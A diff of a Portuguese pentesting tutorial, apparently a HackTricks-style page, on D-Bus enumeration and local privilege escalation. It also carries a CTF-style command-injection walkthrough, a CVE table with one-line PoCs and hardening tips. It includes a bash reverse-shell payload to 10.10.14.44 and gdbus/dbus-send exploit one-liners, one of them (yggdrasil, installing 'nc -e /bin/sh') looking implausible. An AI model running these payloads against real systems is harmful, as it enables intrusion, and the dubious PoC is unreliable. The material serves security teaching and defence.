@@ -4,11 +4,11 @@
 
 ## **Enumeração GUI**
 
-D-Bus é utilizado como o mediador de comunicações entre processos (IPC) em ambientes de desktop Ubuntu. No Ubuntu, a operação simultânea de vários barramentos de mensagens é observada: o barramento do sistema, utilizado principalmente por **serviços privilegiados para expor serviços relevantes em todo o sistema**, e um barramento de sessão para cada usuário logado, expondo serviços relevantes apenas para aquele usuário específico. O foco aqui é principalmente no barramento do sistema devido à sua associação com serviços que operam com privilégios mais altos (por exemplo, root), já que nosso objetivo é elevar privilégios. Nota-se que a arquitetura do D-Bus emprega um 'roteador' por barramento de sessão, que é responsável por redirecionar mensagens de clientes para os serviços apropriados com base no endereço especificado pelos clientes para o serviço com o qual desejam se comunicar.
+O D-Bus é utilizado como o mediador de comunicações entre processos (IPC) em ambientes de desktop Ubuntu. No Ubuntu, observa-se a operação simultânea de vários barramentos de mensagens: o barramento do sistema, utilizado principalmente por **serviços privilegiados para expor serviços relevantes em todo o sistema**, e um barramento de sessão para cada usuário logado, expondo serviços relevantes apenas para aquele usuário específico. O foco aqui está principalmente no barramento do sistema devido à sua associação com serviços que operam com privilégios mais altos (por exemplo, root), já que nosso objetivo é elevar privilégios. Nota-se que a arquitetura do D-Bus emprega um 'roteador' por barramento de sessão, que é responsável por redirecionar mensagens de clientes para os serviços apropriados com base no endereço especificado pelos clientes para o serviço com o qual desejam se comunicar.
 
-Os serviços no D-Bus são definidos pelos **objetos** e **interfaces** que expõem. Objetos podem ser comparados a instâncias de classe em linguagens OOP padrão, com cada instância identificada de forma única por um **caminho de objeto**. Este caminho, semelhante a um caminho de sistema de arquivos, identifica de forma única cada objeto exposto pelo serviço. Uma interface chave para fins de pesquisa é a interface **org.freedesktop.DBus.Introspectable**, que possui um único método, Introspect. Este método retorna uma representação XML dos métodos, sinais e propriedades suportados pelo objeto, com foco aqui em métodos enquanto omite propriedades e sinais.
+Os serviços no D-Bus são definidos pelos **objetos** e **interfaces** que expõem. Objetos podem ser comparados a instâncias de classe em linguagens OOP padrão, com cada instância identificada de forma única por um **caminho de objeto**. Este caminho, semelhante a um caminho de sistema de arquivos, identifica de forma única cada objeto exposto pelo serviço. Uma interface chave para fins de pesquisa é a interface **org.freedesktop.DBus.Introspectable**, que apresenta um único método, Introspect. Este método retorna uma representação XML dos métodos, sinais e propriedades suportados pelo objeto, com foco aqui nos métodos enquanto omite propriedades e sinais.
 
-Para comunicação com a interface D-Bus, duas ferramentas foram empregadas: uma ferramenta CLI chamada **gdbus** para fácil invocação de métodos expostos pelo D-Bus em scripts, e [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), uma ferramenta GUI baseada em Python projetada para enumerar os serviços disponíveis em cada barramento e exibir os objetos contidos em cada serviço.
+Para comunicação com a interface D-Bus, foram empregadas duas ferramentas: uma ferramenta CLI chamada **gdbus** para fácil invocação de métodos expostos pelo D-Bus em scripts, e [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), uma ferramenta GUI baseada em Python projetada para enumerar os serviços disponíveis em cada barramento e exibir os objetos contidos em cada serviço.
 ```bash
 sudo apt-get install d-feet
 ```
@@ -18,15 +18,15 @@ sudo apt-get install d-feet
 
 Na primeira imagem, os serviços registrados com o barramento de sistema D-Bus são mostrados, com **org.debin.apt** especificamente destacado após selecionar o botão System Bus. O D-Feet consulta este serviço em busca de objetos, exibindo interfaces, métodos, propriedades e sinais para os objetos escolhidos, como visto na segunda imagem. A assinatura de cada método também é detalhada.
 
-Uma característica notável é a exibição do **ID do processo (pid)** e da **linha de comando** do serviço, útil para confirmar se o serviço é executado com privilégios elevados, importante para a relevância da pesquisa.
+Uma característica notável é a exibição do **ID do processo (pid)** e da **linha de comando** do serviço, útil para confirmar se o serviço está sendo executado com privilégios elevados, importante para a relevância da pesquisa.
 
 **O D-Feet também permite a invocação de métodos**: os usuários podem inserir expressões Python como parâmetros, que o D-Feet converte em tipos D-Bus antes de passar para o serviço.
 
-No entanto, observe que **alguns métodos requerem autenticação** antes de permitir que os invoquemos. Ignoraremos esses métodos, uma vez que nosso objetivo é elevar nossos privilégios sem credenciais em primeiro lugar.
+No entanto, observe que **alguns métodos requerem autenticação** antes de permitir que os invoquemos. Ignoraremos esses métodos, uma vez que nosso objetivo é elevar nossos privilégios sem credenciais desde o início.
 
 Além disso, note que alguns dos serviços consultam outro serviço D-Bus chamado org.freedeskto.PolicyKit1 para verificar se um usuário deve ser autorizado a realizar certas ações ou não.
 
-## **Enumeração de Cmd line**
+## **Enumeração de Linha de Comando**
 
 ### Listar Objetos de Serviço
 
@@ -120,7 +120,7 @@ cap_mknod cap_lease cap_audit_write cap_audit_control
 cap_setfcap cap_mac_override cap_mac_admin cap_syslog
 cap_wake_alarm cap_block_suspend cap_audit_read
 ```
-### Listar Interfaces de um Objeto de Serviço
+### List Interfaces of a Service Object
 
 Você precisa ter permissões suficientes.
 ```bash
@@ -248,7 +248,7 @@ return render_template('hacker.html', title='Hacker')
 Como você pode ver, está **conectando a uma interface D-Bus** e enviando para a **função "Block"** o "client_ip".
 
 Do outro lado da conexão D-Bus, há um binário compilado em C em execução. Este código está **ouvindo** na conexão D-Bus **por endereços IP e chamando iptables via função `system`** para bloquear o endereço IP fornecido.\
-**A chamada para `system` é vulnerável de propósito a injeção de comandos**, então um payload como o seguinte criará um shell reverso: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
+**A chamada para `system` é vulnerável intencionalmente a injeção de comando**, então um payload como o seguinte criará um shell reverso: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
 
 ### Exploit it
 
@@ -432,7 +432,74 @@ sd_bus_unref(bus);
 return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
 }
 ```
+## Auxiliares de Enumeração Automatizada (2023-2025)
+
+A enumeração de uma grande superfície de ataque D-Bus manualmente com `busctl`/`gdbus` rapidamente se torna dolorosa. Duas pequenas utilidades FOSS lançadas nos últimos anos podem acelerar as coisas durante engajamentos de red-team ou CTF:
+
+### dbusmap ("Nmap para D-Bus")
+* Autor: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
+* Escrito em C; único binário estático (<50 kB) que percorre cada caminho de objeto, puxa o XML `Introspect` e o mapeia para o PID/UID proprietário.
+* Flags úteis:
+```bash
+# Lista todos os serviços no barramento *sistema* e despeja todos os métodos chamáveis
+sudo dbus-map --dump-methods
+
+# Prova ativamente métodos/propriedades que você pode acessar sem prompts do Polkit
+sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
+```
+* A ferramenta marca nomes bem conhecidos não protegidos com `!`, revelando instantaneamente serviços que você pode *possuir* (assumir) ou chamadas de método que são acessíveis a partir de um shell não privilegiado.
+
+### uptux.py
+* Autor: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
+* Script apenas em Python que procura por caminhos *graváveis* em unidades systemd **e** arquivos de política D-Bus excessivamente permissivos (por exemplo, `send_destination="*"`).
+* Uso rápido:
+```bash
+python3 uptux.py -n          # executa todas as verificações, mas não grava um arquivo de log
+python3 uptux.py -d          # habilita saída de depuração detalhada
+```
+* O módulo D-Bus pesquisa os diretórios abaixo e destaca qualquer serviço que pode ser falsificado ou sequestrado por um usuário normal:
+* `/etc/dbus-1/system.d/` e `/usr/share/dbus-1/system.d/`
+* `/etc/dbus-1/system-local.d/` (substituições do fornecedor)
+
+---
+
+## Bugs Notáveis de Escalação de Privilégios D-Bus (2024-2025)
+
+Manter um olho em CVEs recentemente publicados ajuda a identificar padrões inseguros semelhantes em código personalizado. Os seguintes problemas locais de EoP de alto impacto decorrem todos da falta de autenticação/autorização no **barramento do sistema**:
+
+| Ano | CVE | Componente | Causa Raiz | PoC em Uma Linha |
+|------|-----|-----------|------------|---------------|
+| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (daemon HID da Logitech) | O serviço de sistema `logid` expõe uma interface `org.freedesktop.Logiopsd` sem restrições que permite que *qualquer* usuário mude perfis de dispositivo e injete comandos de shell arbitrários via strings de macro. | `gdbus call -y -d org.freedesktop.Logiopsd -o /org/freedesktop/Logiopsd -m org.freedesktop.Logiopsd.LoadConfig "/tmp/pwn.yml"` |
+| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.18 | Um proxy em execução como root encaminha nomes de barramento legados para serviços de backend **sem encaminhar o UID/Contexto Polkit do chamador**, então cada solicitação encaminhada é tratada como UID 0. | `gdbus call -y -d com.deepin.daemon.Grub2 -o /com/deepin/daemon/Grub2 -m com.deepin.daemon.Grub2.SetTimeout 1` |
+| 2025 | CVE-2025-3931 | Red Hat Insights `yggdrasil` ≤ 0.4.6 | O método público `Dispatch` carece de quaisquer ACLs → o atacante pode ordenar o trabalhador do *gerenciador de pacotes* para instalar RPMs arbitrários. | `dbus-send --system --dest=com.redhat.yggdrasil /com/redhat/Dispatch com.redhat.yggdrasil.Dispatch string:'{"worker":"pkg","action":"install","pkg":"nc -e /bin/sh"}'` |
+
+Padrões a notar:
+1. O serviço é executado **como root no barramento do sistema**.
+2. Nenhuma verificação do PolicyKit (ou é contornada por um proxy).
+3. O método leva, em última instância, a `system()`/instalação de pacotes/reconfiguração de dispositivos → execução de código.
+
+Use `dbusmap --enable-probes` ou `busctl call` manual para confirmar se um patch retrocede a lógica adequada de `polkit_authority_check_authorization()`.
+
+---
+
+## Ganhos Rápidos em Dureza & Detecção
+
+* Procure por políticas graváveis para todos ou *send/receive*-abertas:
+```bash
+grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
+```
+* Exija Polkit para métodos perigosos – até mesmo proxies *root* devem passar o PID do *chamador* para `polkit_authority_check_authorization_sync()` em vez de seu próprio.
+* Reduza privilégios em auxiliares de longa duração (use `sd_pid_get_owner_uid()` para mudar namespaces após conectar-se ao barramento).
+* Se você não puder remover um serviço, pelo menos *escopo* para um grupo Unix dedicado e restrinja o acesso em sua política XML.
+* Blue-team: habilite a captura persistente do barramento do sistema com `busctl capture --output=/var/log/dbus_$(date +%F).pcap` e importe para o Wireshark para detecção de anomalias.
+
+---
+
 ## Referências
+
+- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
+- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
+
 
 - [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
 
